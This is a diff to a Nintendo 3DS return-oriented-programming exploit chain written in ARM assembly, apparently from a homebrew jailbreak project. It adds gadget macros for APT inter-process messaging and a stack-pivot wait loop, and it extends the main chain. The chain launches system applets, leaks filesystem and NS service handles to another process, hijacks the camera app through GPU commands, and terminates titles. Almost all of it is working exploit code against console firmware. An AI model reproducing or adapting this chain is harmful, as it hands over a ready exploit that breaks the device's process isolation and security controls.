@@ -21,6 +21,8 @@ GPU_REG_BASE equ 0x1EB00000
 
 SNS_CODE_OFFSET equ 0x0001D300
 
+DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
+
 .macro set_lr,_lr
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NOP ; pop {pc}
@@ -73,6 +75,99 @@ SNS_CODE_OFFSET equ 0x0001D300
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word dst ; r0 (out ptr)
 	memcpy_r0_lr
+.endmacro
+
+.macro apt_open_session,skip
+	set_lr MENU_NOP
+	.if skip != 0
+		skip_0x84
+	.endif
+	.word ROP_MENU_APT_OPENSESSION
+.endmacro
+
+.macro apt_close_session,skip
+	set_lr MENU_NOP
+	.if skip != 0
+		skip_0x84
+	.endif
+	.word ROP_MENU_APT_CLOSESESSION
+.endmacro
+
+.macro apt_send_parameter,dst_id,buffer_ptr,buffer_size,handle_ptr
+	; first dereference handle_ptr
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word handle_ptr ; r0
+	.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
+		.word MENU_LOADEDROP_BUFADR + @@handle_loc ; r4 (destination address)
+	.word ROP_MENU_STR_R0R4_POP_R4PC ; str r0, [r4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+	set_lr ROP_MENU_POP_R4R5PC
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word 0x101 ; r0 (source app_id)
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+		.word dst_id ; r1 (destination app_id)
+	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
+		.word 0x00000001 ; r2 (signal type)
+		.word buffer_ptr ; r3 (parameter buffer ptr)
+		.word 0xDEADBABE ; r4 (garbage)
+		.word 0xDEADBABE ; r5 (garbage)
+		.word 0xDEADBABE ; r6 (garbage)
+	.word ROP_MENU_APT_SENDPARAMETER
+		.word buffer_size ; arg_0 (parameter buffer size) (r4 (garbage))
+		@@handle_loc:
+		.word 0xDEADBABE ; arg_4 (handle passed to dst) (will be overwritten by dereferenced handle_ptr) (r5 (garbage))
+.endmacro
+
+.macro apt_glance_parameter,app_id,buffer_ptr,buffer_size,out_handle_ptr,skip
+	; first dereference handle_ptr
+	set_lr ROP_MENU_POP_R4R5R6PC
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word DUMMY_PTR ; r0 (app_id out ptr)
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+		.word app_id ; r1 (app_id)
+	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
+		.word DUMMY_PTR ; r2 (signal out ptr)
+		.word DUMMY_PTR ; r3 (out buffer ptr)
+		.word 0xDEADBABE ; r4 (garbage)
+		.word 0xDEADBABE ; r5 (garbage)
+		.word 0xDEADBABE ; r6 (garbage)
+	.if skip != 0
+		skip_0x84
+	.endif
+	.word ROP_MENU_APT_GLANCEPARAMETER
+		.word 0x00000000 ; arg_0 (out buffer size) (r4 (garbage))
+		.word DUMMY_PTR ; arg_4 (actual size out ptr) (r5 (garbage))
+		.word DUMMY_PTR ; arg_8 (handle out ptr) (r6 (garbage))
+.endmacro
+
+.macro skip_0x84
+	.word ROP_MENU_ADD_SPSPx64_POP_R4RR11PC
+		.fill 0x84, 0xDA
+.endmacro
+
+.macro wait_for_parameter,app_id
+	@@loop_start:
+	apt_open_session 1
+	apt_glance_parameter app_id, DUMMY_PTR, 0x0, DUMMY_PTR, 1
+	apt_close_session 1
+	; compare to 0x0 value
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+		.word 0x00000000
+	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; cmp r0, r1 ; mvnls r0, #0 ; movhi r0, #1 ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+	; overwrite stack pivot with NOP if equal
+	.word ROP_MENU_POP_R4PC
+		.word MENU_NOP
+	.word ROP_MENU_POP_R0PC
+		.word MENU_OBJECT_LOC + @@loop_pivot - 0x4
+	.word ROP_MENU_STR_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
+		.word MENU_OBJECT_LOC + @@pivot_data + 4 ; r4 (pivot data location)
+	@@loop_pivot:
+	.word ROP_MENU_STACK_PIVOT
+	.word ROP_MENU_POP_R4R5PC
+	@@pivot_data:
+		.word MENU_OBJECT_LOC + @@loop_start ; sp
+		.word MENU_NOP ; pc
 .endmacro
 
 .macro gsp_release_right
@@ -183,9 +278,14 @@ SNS_CODE_OFFSET equ 0x0001D300
 	rop: ; real ROP starts here
 
 		; launch titles to fill space
+			; jpn
 			nss_launch_title 0x20008802, 0x00040030 ; launch SKATER applet
 			nss_launch_title 0x0000c002, 0x00040030 ; launch swkbd applet
 			nss_launch_title 0x00008d02, 0x00040030 ; launch friend applet
+			; us
+			; nss_launch_title 0x20009402, 0x00040030 ; launch SKATER applet
+			; nss_launch_title 0x0000C802, 0x00040030 ; launch swkbd applet
+			; nss_launch_title 0x00009602, 0x00040030 ; launch friend applet
 
 		; launch sns
 			nss_launch_title 0x20008003, 0x00040130 ; launch safe mode ns sysmodule
@@ -202,8 +302,14 @@ SNS_CODE_OFFSET equ 0x0001D300
 			hb_sendhandle sendFsCommand, MENU_FS_HANDLE
 			hb_sendhandle sendNsCommand, MENU_NSS_HANDLE
 
+		; send app parameter
+			apt_open_session 0
+			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR, 0x20, MENU_FS_HANDLE
+			apt_close_session 0
+
 		; launch app that we want to takeover
-			nss_launch_title 0x00020400, 0x00040010 ; launch camera app
+			nss_launch_title 0x00020400, 0x00040010 ; launch camera app (jpn)
+			; nss_launch_title 0x00021400, 0x00040010 ; launch camera app (us)
 
 		; takeover app
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
@@ -215,10 +321,24 @@ SNS_CODE_OFFSET equ 0x0001D300
 		; release gsp rights
 			gsp_release_right
 
+			wait_for_parameter 0x101
+
+			sleep 10*1000*1000, 0x00000000
+
+			apt_open_session 0
+			apt_send_parameter 0x101, MENU_LOADEDROP_BUFADR+gxCommandHook, 0x20, MENU_NSS_HANDLE
+			apt_close_session 0
+
 		; kill off useless launched titles
+			; jpn
 			nss_terminate_tid 0x00008d02, 0x00040030, 100*1000*1000 ; kill friend
 			nss_terminate_tid 0x0000c002, 0x00040030, 100*1000*1000 ; kill swkbd
 			nss_terminate_tid 0x20008802, 0x00040030, 100*1000*1000 ; kill SKATER
+			; us
+			; nss_terminate_tid 0x00009602, 0x00040030, 100*1000*1000 ; kill friend
+			; nss_terminate_tid 0x0000C802, 0x00040030, 100*1000*1000 ; kill swkbd
+			; nss_terminate_tid 0x20009402, 0x00040030, 100*1000*1000 ; kill SKATER
+
 			nss_terminate_tid 0x00003702, 0x00040130, 100*1000*1000 ; kill ro
 
 		; sleep for ever and ever
